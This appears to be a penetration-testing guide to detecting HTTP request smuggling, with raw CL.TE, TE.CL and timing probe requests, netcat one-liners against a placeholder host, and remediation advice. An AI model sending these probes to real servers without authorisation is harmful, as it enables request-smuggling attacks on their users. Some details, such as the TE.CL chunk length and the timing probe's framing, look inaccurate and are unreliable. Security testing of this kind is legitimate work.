# Request Smuggling Detection

## Summary
Detect HTTP request smuggling by sending ambiguous framing headers and observing response discrepancies between front-end and back-end parsers.

## Detection Methodology

### Step 1: Identify Target Infrastructure
Determine if a front-end proxy or CDN sits in front of the origin:
- Check response headers: `CF-Ray`, `X-Served-By`, `Via`, `X-Cache`
- Check for CDN cookies: `__cfduid`, `AKA_A2`
- Check URL patterns: some proxies forward to internal paths

### Step 2: CL.TE Probe
Send a request where the front-end uses Content-Length but the back-end uses Transfer-Encoding:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

```bash
# CL.TE probe with curl
printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | nc target.com 80
```

If the response includes a "400 Bad Request" or similar error for "G", or if the next request on the same connection returns "Unrecognised method G", the back-end processed our smuggled prefix.

### Step 3: TE.CL Probe
Send a request where the front-end uses Transfer-Encoding but the back-end uses Content-Length:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com

0

```

```bash
printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.com\r\n\r\n0\r\n\r\n" | nc target.com 80
```

If the next request returns "Unrecognised method GPOST", the front-end consumed both chunks but the back-end only parsed CL, leaving "GPOST..." as the next request.

### Step 4: Timing-Based Detection
For TE-based variants, smuggle a prefix that delays the response:

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

1
A
X
```

If the response is delayed by the server waiting for chunk "X", smuggling is confirmed.

## Remediation
- Disable HTTP/1.0 fallback on front-end proxies
- Normalise ambiguous headers at the proxy layer
- Reject requests with conflicting Content-Length and Transfer-Encoding
- Use HTTP/2 end-to-end where possible
